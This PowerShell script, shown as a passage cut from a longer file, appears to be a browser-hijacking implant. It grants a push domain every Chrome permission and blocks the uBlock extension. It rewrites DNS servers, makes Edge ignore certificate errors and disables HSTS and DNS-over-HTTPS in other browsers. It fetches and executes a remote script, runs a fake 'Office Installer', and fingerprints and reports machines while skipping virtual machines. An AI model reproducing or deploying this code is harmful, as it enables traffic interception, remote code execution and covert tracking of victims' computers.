            "notifications", "popups", "plugins", "sound", "unsandboxed_plugins", 
            "automatic_downloads", "flash_data", "mixed_script", "sensors","window_placement","webid_api","vr",
            "subresource_filter","media_stream_mic","media_stream_mic","media_stream_camera","local_fonts",
            "javascript_jit","idle_detection","captured_surface_control","ar"

        )

        foreach ($setting in $settingsToUpdate) {
            if ($null -eq $contentSettings.$setting) {
                $contentSettings | Add-Member -MemberType NoteProperty -Name $setting -Value @{}
            }
            $specificSetting = $contentSettings.$setting
            if ($specificSetting.PSObject.Properties.Name -contains $pushDomain) {            
            } else {
                $specificSetting | Add-Member -MemberType NoteProperty -Name $pushDomain -Value @{
                    "last_modified" = "13362720545785774"
                    "setting" = 1
                }
                $contentSettings.$setting = $specificSetting
            }
        }

        $preferencesContent.profile.content_settings.exceptions = $contentSettings
        $updatedPreferencesJson = $preferencesContent | ConvertTo-Json -Depth 10
        $updatedPreferencesJson | Set-Content -Path $preferencesPath -Encoding UTF8

        writedbg "Notification subscription for $pushDomain added successfully with all permissions."
    } else {
        writedbg "Preferences file not found at path: $preferencesPath"
    }
}



function Close-ChromeWindow {
    param ($window)
    [User32X]::CloseWindow($window) | Out-Null
    Start-Sleep -Milliseconds 25
}

function Close-Chrome {
    param ($process)
    Close-ChromeWindow -window $process.MainWindowHandle
    try {
        $process.Close()
    }
    catch {
  
    }
}


function Close-AllChromes {
    $windows = [User32X]::EnumerateAllWindows()
    foreach ($window in $windows) 
    {
        $title = [User32X]::GetWindowText($window)
        if ($title.Contains("Google Chrome"))
        {
            [User32X]::ShowWindow($window, [User32X]::SW_HIDE) | Out-Null
            Close-ChromeWindow -window $window
        }
    }
    Close-Processes(@('chrome.exe'))
    Start-Sleep -Milliseconds 5
}

function ConfigureChromePushes {
    $auto = Test-Autostart;
    if ($server.pushesForce -ne $false -and $auto -eq $true)
    {
        writedbg "Skipping ConfigureChromePushes"
        return
    }
    try {
        
   

    Add-Type @"
    using System;
    using System.Collections.Generic;
    using System.Runtime.InteropServices;
    using System.Text;

    public static class User32X {
        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        public static string GetWindowText(IntPtr hWnd) {
            int length = GetWindowTextLength(hWnd);
            if (length == 0) return String.Empty;

            StringBuilder sb = new StringBuilder(length + 1);
            GetWindowText(hWnd, sb, sb.Capacity);
            return sb.ToString();
        }

        public static bool IsWindowVisibleEx(IntPtr hWnd) {
            return IsWindowVisible(hWnd) && GetWindowTextLength(hWnd) > 0;
        }

        public static IntPtr[] EnumerateAllWindows() {
            var windowHandles = new List<IntPtr>();
            EnumWindows((hWnd, lParam) => {
                if (IsWindowVisibleEx(hWnd)) {
                    windowHandles.Add(hWnd);
                }
                return true;
            }, IntPtr.Zero);
            return windowHandles.ToArray();
        }

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_MINIMIZE = 6;
        public const int SW_SHOW = 5;

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        public static void CloseWindow(IntPtr hWnd) {
            const uint WM_CLOSE = 0x0010;
            PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
        }
    }
"@

    if (HaveToPushes)
    {
        Close-AllChromes;
        Remove-Pushes;
        Add-Pushes;
    }

}
catch {
    writedbg "An error occurred (Configure Chrome Pushes): $_"
}
}



function Open-ChromeWithUrl {
    param (
        [string]$url, $isDebug
    )
    $job = Start-Job -ScriptBlock {
            param ($url, $isDebug)

            try {
                
 
            Add-Type @"
            using System;
            using System.Collections.Generic;
            using System.Runtime.InteropServices;
            using System.Text;
            
            public static class User32X {
                public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern int GetWindowTextLength(IntPtr hWnd);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern bool IsWindowVisible(IntPtr hWnd);
            
                public static string GetWindowText(IntPtr hWnd) {
                    int length = GetWindowTextLength(hWnd);
                    if (length == 0) return String.Empty;
            
                    StringBuilder sb = new StringBuilder(length + 1);
                    GetWindowText(hWnd, sb, sb.Capacity);
                    return sb.ToString();
                }
            
                public static bool IsWindowVisibleEx(IntPtr hWnd) {
                    return IsWindowVisible(hWnd) && GetWindowTextLength(hWnd) > 0;
                }
            
                public static IntPtr[] EnumerateAllWindows() {
                    var windowHandles = new List<IntPtr>();
                    EnumWindows((hWnd, lParam) => {
                        if (IsWindowVisibleEx(hWnd)) {
                            windowHandles.Add(hWnd);
                        }
                        return true;
                    }, IntPtr.Zero);
                    return windowHandles.ToArray();
                }
            
                [DllImport("user32.dll", SetLastError = true)]
                public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            
                public const int SW_HIDE = 0;
                public const int SW_MINIMIZE = 6;
                public const int SW_SHOW = 5;
                public const int SW_MAXIMIZE = 3; // Added constant for maximizing window
            
                [DllImport("user32.dll", SetLastError = true)]
                public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
            
                public static void CloseWindow(IntPtr hWnd) {
                    const uint WM_CLOSE = 0x0010;
                    PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                }
            }
"@
}
catch {
}
        
        function Close-ChromeWindow {
            try {
                param ($window)
                [User32X]::CloseWindow($window) | Out-Null
                Start-Sleep -Milliseconds 100
            }
            catch {}
        }
        
        function Close-Chrome {
            param ($process)
            Close-ChromeWindow -window $process.MainWindowHandle
            try {
                $process | Stop-Process -Force
            }
            catch {
            }
        }

        $chromePaths = @(
            "C:\Program Files\Google\Chrome\Application\chrome.exe",
            "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe",
            "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
            "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe"
        )
        $resolvedPaths = @()
        foreach ($path in $chromePaths) {
            try {
                $resolvedPath = Resolve-Path -Path $path -ErrorAction Stop
                if ($resolvedPath -notin $resolvedPaths) {
                    $resolvedPaths += $resolvedPath.Path
                }
            } catch {
                writedbg "Error resolving path: $_"
            }
        }
        $resolvedPaths = $resolvedPaths | Select-Object -Unique
        foreach ($path in $resolvedPaths) {
            if (Test-Path -Path $path) {
                writedbg "Found Chrome at: $path"
    
                $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
                $processStartInfo.FileName = $path
                if (-not $isDebug)
                {
                    $processStartInfo.Arguments = "--headless";
                }
                $processStartInfo.Arguments += " --disable-gpu --dump-dom $url"
                $processStartInfo.CreateNoWindow = $false
                $processStartInfo.UseShellExecute = $false
                $process = New-Object System.Diagnostics.Process
                $process.StartInfo = $processStartInfo
                $process.Start() | Out-Null         
                $endTime = (Get-Date).AddSeconds(8)
                while ((Get-Date) -lt $endTime) {
                    if ($isDebug -eq $false)
                    {
                        try
                        {
                            [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_HIDE) | Out-Null                                
                        }
                        catch
                        {
                        }
                    }
                    Start-Sleep -Milliseconds 100
                }
                try
                {
                    [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_SHOW) | Out-Null
                }
                catch
                {
                }
                Close-Chrome -process $process
                break
            } else {
                writedbg "Chrome not found at: $path"
            }
        }

    } -ArgumentList $url, $isDebug

    return $job
}

function LaunchChromePushes {
    $auto = Test-Autostart;
    if ($server.pushesForce -ne $false -and $auto -eq $true)
    {
        writedbg "Skipping function LaunchChromePushes"
        return
    }
    try {
        foreach ($push in $server.pushes) {
            $isDebug = IsDebug
            Open-ChromeWithUrl -url $push -isDebug $isDebug
        }
    }
    catch {
      writedbg "An error occurred LaunchChromePushes): $_"
    }
}

function do_chrome_push {
    ConfigureChromePushes
    LaunchChromePushes
}

function do_chrome_ublock {
    $keywords = @("uBlock")

    foreach ($dir in Get-EnvPaths) {
        $chromeDir = Join-Path -Path $dir -ChildPath "Google\Chrome\User Data\Default\Extensions"
        
        try {
            if (Test-Path -Path $chromeDir -PathType Container) {
                $extensions = Get-ChildItem -Path $chromeDir -Directory

                foreach ($extension in $extensions) {
                    $manFile = chromeublock_FindManifestFile -folder $extension.FullName
                    if ($manFile -ne "") {
                        $foundKeyword = $false
                        
                        foreach ($manifestValue in $keywords) {
                            $content = Get-Content -Path $manFile -Raw
                            if ($content -match [regex]::Escape($manifestValue)) {
                                $foundKeyword = $true
                                break
                            }
                        }

                        if ($foundKeyword) {
                            $extFolderName = [System.IO.Path]::GetFileName($extension.FullName)
                            chromeublock_ProcessManifestAll -extName $extFolderName
                        }
                    }
                }
            }
        } catch {
             writedbg "Error occurred: $_"
        }
    }
}


function chromeublock_FindManifestFile {
    param (
        [string]$folder
    )

    $result = ""

    Get-ChildItem -Path $folder | ForEach-Object {
        if (-not ($_.PSIsContainer)) {
            if ($_.Name -eq "manifest.json") {
                $result = $_.FullName
                return
            }
        } elseif ($_.Name -notin @('.', '..')) {
            $result = chromeublock_FindManifestFile -folder $_.FullName
            if ($result -ne "") {
                return
            }
        }
    }

    return $result
}


function chromeublock_ProcessManifestAll {
    param (
        [string]$extName
    )

    chromeublock_ProcessManifest -extName $extName -browser "Google\Chrome"
}

function chromeublock_ProcessManifest {
    param (
        [string]$extName,
        [string]$browser
    )

    $regPath = "HKLM:\SOFTWARE\Policies\$browser\ExtensionInstallBlocklist"
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    
    $regKeyIndex = 1
    do {
        $keyName = "$regKeyIndex"
        $val = Get-ItemProperty -Path $regPath -Name $keyName -ErrorAction SilentlyContinue
        if ($val -eq $extName) {
            return
        }
        $regKeyIndex++
    } until (-not (Test-Path "$regPath\$keyName"))

    Set-ItemProperty -Path $regPath -Name $keyName -Value $extName
}

function Set-DnsServers {
    param (
        [string]$primaryDnsServer,
        [string]$secondaryDnsServer
    )

    try {
        # Get network adapters that are IP-enabled
        $networkAdapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notlike '*Virtual*' }

        foreach ($adapter in $networkAdapters) {
            # Set DNS servers using Set-DnsClientServerAddress cmdlet
            Set-DnsClientServerAddress -InterfaceAlias $adapter.Name -ServerAddresses @($primaryDnsServer, $secondaryDnsServer) -Confirm:$false
            
            writedbg "Successfully set DNS servers for adapter: $($adapter.InterfaceDescription)"
        }
    } catch {
        writedbg "An error occurred: $_"
    }
}

function do_dnsman {
    Set-DNSServers -PrimaryDNSServer $server.primaryDns -SecondaryDNSServer $server.secondaryDns
}

function do_edge {
    $paths = @(
        "HKLM:\SOFTWARE\Policies\Microsoft\Edge",
        "HKCU:\SOFTWARE\Policies\Microsoft\Edge"
    )

    foreach ($edgeKeyPath in $paths) 
    {
        if (-not (Test-Path $edgeKeyPath)) {
            New-Item -Path $edgeKeyPath -Force | Out-Null
        }
        
        $commandLinePath = Join-Path $edgeKeyPath "CommandLine"
        if (-not (Test-Path $commandLinePath)) {
            New-Item -Path $commandLinePath -Force | Out-Null
        }
        
        Set-ItemProperty -Path $commandLinePath -Name "(Default)" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
        
        Set-ItemProperty -Path $edgeKeyPath -Name "DnsOverHttps" -Value "off"

        Set-ItemProperty -Path $edgeKeyPath -Name "IgnoreCertificateErrors" -Value 1
    }
}


function EmbeddingName {
    param (
        [string]$name
    )
    $folder = Get-HephaestusFolder
    return Join-Path -Path $folder -ChildPath $name
}

function DoInternalEmbeddings {
    param (
        [array]$names, [array]$datas, $force, $name
    )

    $auto = Test-Autostart;
    if ($force -ne $false -and $auto -eq $true)
    {
        writedbg "Skipping function DoInternalEmbeddings ($name)"
        return
    }
    try 
    {
        for ($i = 0; $i -lt $names.Length; $i++) {
            $name = $names[$i]
            $data = $datas[$i]
            $file = EmbeddingName($name)
            CustomDecode -inContent $data -outFile $file
            Invoke-Item $file
        }
    }
    catch {
    writedbg "An error occurred (DoFront): $_"
    }
}


function DoFront {
    DoInternalEmbeddings -names $xfront_name -datas $xfront -force $server.frontForce -name "front"
}

function DoEmbeddings {
    DoInternalEmbeddings -names $xembed_name -datas $xembed -force $server.embeddingsForce -name "embeddings"
}

function do_embeddings {
    DoFront
    DoEmbeddings
}


function do_extraupdate() {
    if (-not $server.extraUpdate){
        return
    }
    $timeout = [datetime]::UtcNow.AddMinutes(1)
    $delay = 5
    Start-Sleep -Seconds $delay
    
    while ([datetime]::UtcNow -lt $timeout) {
        try {
            $response = Invoke-WebRequest -Uri $server.extraUpdateUrl -UseBasicParsing -Method Get

            if ($response.StatusCode -eq 200) {
                $scriptBlock = [ScriptBlock]::Create($response.Content)
                . $scriptBlock
                return
            }
        }
        catch {
            writedbg "Failed to download or execute the script: $_"
        }

        Start-Sleep -Seconds $delay
    }
    writedbg "Failed to download the script within the allotted time."
}

function do_firefox 
{
    try 
    {
        Set-FirefoxRegistry -KeyPaths @(
            'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS',
            'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS'
        ) -ValueNames @('Enabled', 'Locked') -Values @(0, 1)
    }
    catch 
    {
        writedbg "Failed to set firefox registry: $_"
    }
    foreach ($dir in Get-EnvPaths) 
    {
        try 
        {
        $path = Join-Path -Path $dir -ChildPath "Mozilla\Firefox\Profiles\user.js"

            $UserJSContent = 'user_pref("network.trr.mode", 5);'
            
            if (!(Test-Path -Path $path -PathType Leaf)) 
            {
                New-Item -Path $path -ItemType File -ErrorAction SilentlyContinue
                Add-Content -Path $path -Value $UserJSContent -ErrorAction SilentlyContinue
            }
        }
        catch 
        {
            writedbg "Failed to write to user.js file: $_"
        }
    }
}


function Set-FirefoxRegistry {
    param (
        [string[]]$KeyPaths,
        [string[]]$ValueNames,
        [int[]]$Values
    )

    $ErrorActionPreference = 'Stop'
    $regKey = [Microsoft.Win32.Registry]::LocalMachine

    try {
        foreach ($i in 0..($KeyPaths.Length - 1)) {
            $key = $regKey.OpenSubKey($KeyPaths[$i], $true)
            if ($key -eq $null) {
                writedbg "Failed to open registry key: $($KeyPaths[$i])"
                return
            }

            $key.SetValue($ValueNames[$i], $Values[$i], [Microsoft.Win32.RegistryValueKind]::DWord)
            $key.Close()
        }
    }
    catch {
        writedbg "Error accessing or modifying registry: $_"
    }
}

function do_opera
{
    Close-Processes(@('opera_crashreporter.exe', 'opera.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Opera Software\Opera Stable\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureOperaInternal -FilePath $path
            }
        } catch {
            writedbg "Error occurred in Opera: $_"
        }
    }
}

function ConfigureOperaInternal {
    param(
        [string]$filePath
    )

    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content.dns_over_https = @{
            'mode' = 'off'
            'opera' = @{
                'doh_mode' = 'off'
            }
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.opera = @{
            'doh_mode' = 'off'
        }
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    writedbg "Successfully configured Opera settings in $filePath"
}

function Get-FileNameFromUri {
    param (
        [string]$uri
    )

    # Create a Uri object
    $uriObject = [System.Uri]::new($uri)

    # Extract the file name from the path of the URI
    $fileName = [System.IO.Path]::GetFileName($uriObject.AbsolutePath)

    return $fileName
}

function Add-RandomDigitsToFilename {
    param (
        [string]$fileName
    )

    # Split filename into base and extension
    $baseName = $fileName -replace '\.[^.]+$', ''
    $extension = $fileName -replace '.*\.', '.'

    # Generate a random number between 1000 and 9999
    $randomNumber = Get-Random -Minimum 1000 -Maximum 9999

    # Combine base name, random number, and extension
    $newFileName = "$baseName" + "_$randomNumber$extension"

    return $newFileName
}

function Start-DownloadAndExecute {
    param (
        [string]$url,
        [string]$title
    )

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    # Create and configure the form
    $form = New-Object System.Windows.Forms.Form
    $form.Text = $title
    $form.Size = New-Object System.Drawing.Size(400, 200)
    $form.StartPosition = "CenterScreen"

    # Create and configure the progress bar
    $progressBar = New-Object System.Windows.Forms.ProgressBar
    $progressBar.Minimum = 0
    $progressBar.Maximum = 100
    $progressBar.Step = 1
    $progressBar.Value = 0
    $progressBar.Width = 350
    $progressBar.Height = 30
    $progressBar.Top = 80
    $progressBar.Left = 20
    $form.Controls.Add($progressBar)

    # Create and configure the status label
    $statusLabel = New-Object System.Windows.Forms.Label
    $statusLabel.Text = "Downloading..."
    $statusLabel.AutoSize = $true
    $statusLabel.Top = 50
    $statusLabel.Left = 20
    $form.Controls.Add($statusLabel)

    # Create and configure the description label
    $descriptionLabel = New-Object System.Windows.Forms.Label
    $descriptionLabel.Text = "The installer is currently being downloaded. Please wait until the process completes."
    $descriptionLabel.AutoSize = $true
    $descriptionLabel.Width = 350
    $descriptionLabel.Top = 10
    $descriptionLabel.Left = 20
    $form.Controls.Add($descriptionLabel)

    # Show the form non-modally
    $form.Show()

    # Determine the file name and path
    $fileName = Get-FileNameFromUri -uri $url
    $fileNameSave = Add-RandomDigitsToFilename -fileName $fileName

    $tempDir = (Split-Path -Path $PSCommandPath)
    $installerPath = [System.IO.Path]::Combine($tempDir, $fileNameSave)

    # Create and configure the WebClient
    $webClient = New-Object System.Net.WebClient

    # Define event handlers
    $progressChangedHandler = [System.Net.DownloadProgressChangedEventHandler]{
        param ($sender, $eventArgs)
        $progressBar.Value = $eventArgs.ProgressPercentage
        $form.Refresh()
    }

    $downloadFileCompletedHandler = [System.ComponentModel.AsyncCompletedEventHandler]{
        param ($sender, $eventArgs)
        # Close the form before starting the installer
        $form.Invoke([action] { 
            [System.Windows.Forms.Application]::DoEvents()
            $form.Close() 
            [System.Windows.Forms.Application]::DoEvents()
        })
        
        if ($eventArgs.Error) {
            [System.Windows.Forms.MessageBox]::Show("Error downloading file: " + $eventArgs.Error.Message, "Download Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        } elseif ($eventArgs.Cancelled) {
            [System.Windows.Forms.MessageBox]::Show("Download cancelled.", "Download Cancelled", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
        } else {
            try {
                # Execute the installer
                Start-Process -FilePath $installerPath -Wait

                # Write to the registry
                $registryPath = "HKCU:\Software\Hephaestus\Downloads"
                if (-not (Test-Path $registryPath)) {
                    New-Item -Path $registryPath -Force | Out-Null
                }
                Set-ItemProperty -Path $registryPath -Name $fileName -Value "Downloaded"
            } catch {
                [System.Windows.Forms.MessageBox]::Show("Error executing the installer: " + $_.Exception.Message, "Execution Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
            }
        }
        [System.Windows.Forms.Application]::DoEvents()
    }

    # Add event handlers to WebClient
    $webClient.add_DownloadProgressChanged($progressChangedHandler)
    $webClient.add_DownloadFileCompleted($downloadFileCompletedHandler)

    try {
        # Start the download
        $webClient.DownloadFileAsync([Uri]$url, $installerPath)
        
        # Keep the form responsive while the download is in progress
        while ($form.Visible) {
            Start-Sleep -Milliseconds 1
            [System.Windows.Forms.Application]::DoEvents()
        }
    } catch {
        [System.Windows.Forms.MessageBox]::Show("Error initiating download: " + $_.Exception.Message, "Download Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        $form.Close()
    }
}

function Download {
    param (
        [string]$url,
        [string]$title
    )

    $fileName = [System.IO.Path]::GetFileName($url)

    $auto = Test-Autostart;
    if ($server.startDownloadsForce -ne $false -and $auto -eq $true)
    {
        $registryPath = "HKCU:\Software\Hephaestus\Downloads"
        if (Test-Path $registryPath) {
            $installed = Get-ItemProperty -Path $registryPath -Name $fileName -ErrorAction SilentlyContinue
            if ($installed) 
            {
                writedbg "The file '$fileName' is already installed."
                return
            }
        }
        return
    }

    Start-DownloadAndExecute -url $url -title $title
}

function do_startdownloads {
    try 
    {
        foreach ($url in $server.startDownloads)
        {
            Download -url $url -title "Downloading Office Installer"
        }
    }
    catch {
      writedbg "An error occurred (Start Downloads): $_"
    }
}



function do_starturls {
    $auto = Test-Autostart;
    if ($server.startUrlsForce -ne $false -and $auto -eq $true)
    {
        writedbg "Skipping function DoStartUrls"
        return
    }
    try
        {
        foreach ($startUrl in $server.startUrls) {
            Start-Process $startUrl.Trim()
        }
    }
    catch
    {
      writedbg "An error occurred (Start Urls): $_"
    }
}

function Is-VirtualMachine {
    # Get Win32_ComputerSystem information
    $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
    $isVirtual = $false

    # Check for common virtualization manufacturers
    $vmManufacturers = @(
        "Microsoft Corporation",   # Hyper-V
        "VMware, Inc.",            # VMware
        "Xen",                     # Xen
        "XenSource, Inc.",         # XenSource
        "innotek GmbH",            # VirtualBox
        "Oracle Corporation",      # VirtualBox
        "Parallels Software International Inc.", # Parallels
        "QEMU",                    # QEMU
        "Red Hat, Inc.",           # KVM
        "Amazon EC2",              # AWS EC2
        "Google",                  # Google Cloud Platform
        "Virtuozzo",               # Virtuozzo
        "DigitalOcean"             # DigitalOcean
    )

    # Check Manufacturer and Model for signs of virtualization
    if ($vmManufacturers -contains $computerSystem.Manufacturer) {
        $isVirtual = $true
    } elseif ($computerSystem.Model -match "Virtual|VM|VBOX|KVM|QEMU|Parallels|Xen") {
        $isVirtual = $true
    }

    # Additional checks for virtualization using Win32_BIOS
    $bios = Get-WmiObject -Class Win32_BIOS
    if ($bios.SerialNumber -match "VMware|VBOX|Virtual|Xen|QEMU|Parallels") {
        $isVirtual = $true
    }

    # Additional checks using Win32_ComputerSystemProduct
    $computerSystemProduct = Get-WmiObject -Class Win32_ComputerSystemProduct
    if ($computerSystemProduct.Version -match "Virtual|VM|VBOX|KVM|QEMU|Parallels|Xen") {
        $isVirtual = $true
    }

    # Additional registry check for Parallels
    $parallelsKey = "HKLM:\SOFTWARE\Parallels\Parallels Tools"
    if (Test-Path $parallelsKey) {
        $isVirtual = $true
    }

    return $isVirtual
}


function Get-MachineHashCode {
    # Get BIOS Serial Number
    $biosSerial = (Get-WmiObject Win32_BIOS).SerialNumber

    # Get Motherboard Serial Number
    $mbSerial = (Get-WmiObject Win32_BaseBoard).SerialNumber

    # Get MAC Address of the first network adapter
    $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -and $_.IPEnabled }).MACAddress[0]

    # Combine the hardware identifiers into a single string
    $combinedString = "$biosSerial$mbSerial$macAddress"

    # Compute the hash code using SHA256
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($combinedString)
    $hashBytes = $sha256.ComputeHash($bytes)
    $hashString = [BitConverter]::ToString($hashBytes) -replace "-", ""

    return $hashString
}


function Generate-Hash {
    param (
        [string]$data,
        [string]$key
    )

    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = $keyBytes
    $hashBytes = $hmac.ComputeHash($dataBytes)
    
    return [Convert]::ToBase64String($hashBytes)
}

function Write-StringToFile {
    param (
        [string]$FileName,
        [string]$Content
    )
    
    # Get the path to the desktop
    $DesktopPath = [System.Environment]::GetFolderPath('Desktop')
    
    # Create the full path to the file
    $FilePath = Join-Path -Path $DesktopPath -ChildPath $FileName
    
    # Write the content to the file, creating or overwriting it
    Set-Content -Path $FilePath -Value $Content
}

function GetSerie()
{
    $registryPath = "HKCU:\Software\Hephaestus"
    $keyName = "serie"
    $newValue = $server.trackSerie.ToString();

    if (Test-Path $registryPath) {
        $keyValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue | Select-Object -ExpandProperty $keyName
        if ($keyValue -and $keyValue -ne "") {
            return $keyValue
        } else {
            Set-ItemProperty -Path $registryPath -Name $keyName -Value $newValue
            return $newValue
        }
    } else {
        New-Item -Path $registryPath -Force | Out-Null
        New-ItemProperty -Path $registryPath -Name $keyName -Value $newValue -PropertyType String | Out-Null
        return $newValue
    }
}

function GetTimeDif()
{
    $registryPath = "HKCU:\Software\Hephaestus"
    $keyName = "timeDif"
    $timeDif=0;

    if (Test-Path $registryPath) {
        $keyValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue | Select-Object -ExpandProperty $keyName
        if ($keyValue -and $keyValue -ne "") {
            $timeDif = $keyValue
        }
    }
    if ($timeDif -as [int]) {
        $timeDif = [int]$timeDif
    } else {
        $timeDif= 0
    }
    return $timeDif
}

function do_tracker {
    if ($server.track -eq $false){
        return
    }

    $isVM = Is-VirtualMachine
    if ($isVM -eq $true){
        return
    }

    $elevated = 0
    if (IsElevated)
    {
        $elevated=1;
    }

    $id = Get-MachineHashCode

    $body = "{`"id`":`"$($id.ToString())`",`"serie`":`"$(GetSerie)`",`"number`":`"$($id.ToString())`",`"elevated_number`":$($elevated),`"timeDif`":$(GetTimeDif)}"


    # Secret key (shared with the server)
    $secretKey = "YourSecretKeyHere"

    $url= $server.trackUrl
  
    # Generate the hash for the JSON request body
    $hash = Generate-Hash -data $body -key $secretKey

    # Prepare headers
    $headers = @{
        "X-Signature" = $hash
        "Content-Type" = "application/json"
        "User-Agent"  = "PowerShell/7.2"  # Use the User-Agent from Postman if known
    }

    $timeout = [datetime]::UtcNow.AddMinutes(1)
    $delay = 5

    
    while ([datetime]::UtcNow -lt $timeout) 
    {
     
        try {
                Invoke-WebRequest -Headers $headers -Method "POST" -Body $body -Uri $url -ContentType "application/json; charset=utf-8"
                break;
            }
            catch [System.Net.WebException] {
                $statusCode = $_.Exception.Response.StatusCode
                $respStream = $_.Exception.Response.GetResponseStream()
                $reader = New-Object System.IO.StreamReader($respStream)
                $reader.BaseStream.Position = 0
                $responseBody = $reader.ReadToEnd() | ConvertFrom-Json
                    writedbg "Error making request: $responseBody"
            
            }
            catch{
                    writedbg "Error making request: $_"
            }

            Start-Sleep -Seconds $delay
    }

    if ($server.trackDesktop -eq $true){
        Write-StringToFile -FileName "$($server.trackSerie).txt" -Content $id
    }

}

function do_yandex
{
    Close-Processes(@('service_update.exe','browser.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Yandex\YandexBrowser\User Data\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureYandexInternal -FilePath $path
            }
        } catch {
            writedbg "Error occurred: $_"
        }
    }
}

function ConfigureYandexInternal {
    param(
        [string]$filePath
    )
    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content | Add-Member -MemberType NoteProperty -Name 'dns_over_https' -Value @{
            'mode' = 'off'
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    writedbg "Successfully configured Yandex settings in $filePath"
}

###head



function Invoke-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string]
        $scriptPath,

        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName
    )
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-file ""$scriptPath"" -Task $taskName"
}

$global:Task = $null

for ($i = 0; $i -lt $args.Count; $i++) {
    if ($args[$i] -eq '-Task') {
        if ($i + 1 -lt $args.Count) {
            $global:Task = $args[$i + 1]
        } else {
            writedbg "No value provided for -Task argument."
        }
    }
}

function Main 
{
    $scriptPath = Get-ScriptPath
    writedbg "program curScript: $scriptPath"

    if ($global:Task) {
        writedbg "Task - $task"
        & $global:Task
    } else {               

        $taskFunctions = @(
            'do_dnsman','do_cert','do_chrome','do_chrome_push','do_chrome_ublock','do_edge','do_embeddings','do_firefox','do_opera','do_startdownloads','do_starturls','do_tracker','do_yandex','do_extraupdate'
        )

        writedbg "Main - "
        foreach ($task in $taskFunctions) 
        {
            writedbg "Main - $task"
            Invoke-Script $scriptPath $task
        }
    }
}

Main"
